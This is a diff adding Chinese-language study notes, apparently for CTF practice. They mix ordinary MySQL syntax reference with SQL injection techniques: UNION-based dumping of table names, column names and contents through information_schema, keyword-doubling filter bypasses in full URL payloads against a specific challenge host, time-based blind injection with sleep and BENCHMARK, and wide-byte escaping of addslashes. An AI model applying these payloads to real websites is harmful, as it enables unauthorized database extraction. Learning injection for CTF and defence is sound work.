@@ -1,0 +1,155 @@
+UNION 操作符用于合并两个或多个 SELECT 语句的结果集。
+SELECT * from tables;
+
+database()返回当前sql库名
+select database();
+
+group_concat()联结在一行
+group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])
+
+
+
+爆表名
+     group_concat(table_name) from information_schema.tables where table_schema=database()
+     UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   
+     SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
+     Select table_name from information_schema.tables;
+     1 union select schema_name from information_schema.schemata
+合并爆表名
+     SELECT table_schema,group_concat(table_name) FROM information_schema.tables WHERE table_schema!='information_schema' group by table_schema;
+     SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema!='information_schema' group by table_schema;
+//
+
+爆列名
+    (column_name) select group_concat(column_name) from information_schema.columns where table_name = "users";
+
+爆内容 
+    select table from column_name;
+
+id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#
+
+
+过滤了select union or and
+可采用双写绕过
+构造
+查库名
+http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,database()%23
+union select 1,database()#
+查表名
+http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20table_name%20from%20infoorrmation_schema.tables%20where%20table_schema=database()%20limit%200,1)%23
+?id = 1 union (select table_name from information_schema.tables where table_schema = database() limit 0,1)%23
+?id=1 union select 1,
+table_name from information_schema.tables where table_schema = database()#
+查列名
+http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema=database()%20anandd%20table_name=%27flag1%27%20limit%200,1)%23
+union select 1,(select column_name from information_schema.columns where table_schema=database() and table_name = 'flag1' limit 0,1)
+?id=1 union select 1,(select column_name from information_schema.columns where
+table_schema = database() and table_name = 'thiskey' limit 0,1)#
+?id=-1%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name%20=%20%27thiskey%27%20limit%200,1#
+查列名
+http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema=database()%20anandd%20table_name=%27flag1%27%20limit%201,1)%23
+根据列名查内容
+http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20address%20from%20flag1%20limit%200,1)%23
+?id=-1'uniunionon selselectect 1,(selselectect address from flag1 limit (0,1))#
+?id=-1'uniunionon selselectect 1,(selselectect flag1 from flag1 limit (0,1))#
+?id=-1'uniunionon selselectect 1,(selselectect * from flag1 limit(0,1))#
+
+
+注意字符串的编码
+为16进制 
+
+降序查看 desc
+升序查看 asc
+
+一般的，表名与字段名都使用反引号就波浪线键那个``
+
+
+查询：
+SELECT column_name,column_name
+FROM table_name
+[WHERE Clause]
+[LIMIT N][ OFFSET M]
+
+limit子句可以用于强制select语句返回制定的记录数，limit接受一个或两个数字的参数，如果给定两个参数第一个指定返回记录行的偏移量，第二个指定返回记录行的最大数目
+
+select * from test;
+ 
+group by 语句
+
+CASE WHEN salary >= 5000  　     THEN salary * 0.9 
+
+用select case when写法如下：
+SELECT grade, COUNT (CASE WHEN sex = 1 THEN 1     
+                            ELSE NULL
+                        END) 男生数,
+               COUNT (CASE WHEN sex = 2 THEN 1
+                            ELSE NULL
+                       END) 女生数
+FROM students
+
+GROUP BY grade;
+
+
+locate(substr,str,pos):
+返回字符串str中第一个出现子 字符substr串的 str位置，从位置pos开始 默认pos 0  如果substr不在，则 返回null
+SELECT LOCATE('bar', 'foobarbar', 5);
+
+例子
+我们如何用sql查找所有"emails"字段中有"aa@fujieace.com"的用户？
+select * from users where locate('aa@email.com',emails);
+
+
+通过locate()爆内容
+select locate(binary'"s"',(select table_name from information_schema.tables where table_schema=database() limit 0,1));
+
+DROP TABLE "表格名";
+
+盲注可用函数：
+BENCHMARK(expr,count)
+BENCHMARK(100000000,md5(1))
+sleep(5)
+将表达式expr执行count次
+
+
+as 可理解为：用作、当成，作为；一般是重命名列名或者表名。（主要为了查询方便）
+
+
+union和union all的区别是,union会自动压缩多个结果集合中的重复结果，而union all则将所有的结果全部显示出来，不管是不是重复
+
+查编码
+show variables like 'character_set_database';
+show create tables <表格>
+
+宽字节注入原理
+
+addslashes()会转义四个字符 分别为 ' 和 '' 和 \ 和 NUL 
+
+0xbf27 0x27为' 被\转义  -> 0xbf5c27
+
+
+COUNT(*) 函数返回在给定的选择中被选的行数。
+SELECT COUNT(*) FROM table
+
+
+ORDER BY 语句
+ORDER BY 语句用于根据指定的列对结果集进行排序。
+ORDER BY 语句默认按照升序对记录进行排序。
+如果您希望按照降序对记录进行排序，可以使用 DESC 关键字
+
+order by 根据给出的列号排序
+order by 3 正确 4 错误
+例子:
+猜测column数两种方法
+select * from sqltest where id=1 order by 3;
+select * from sqltest where id=1 union select 1,2,3;
+
+
+注释方法
+
+需要特别注意 -- 这种注释后面要加一个空格
+
+#DELETE FROM SeatInformation
+
+/*DELETE FROM SeatInformation */
+
+-- DELETE FROM SeatInformation
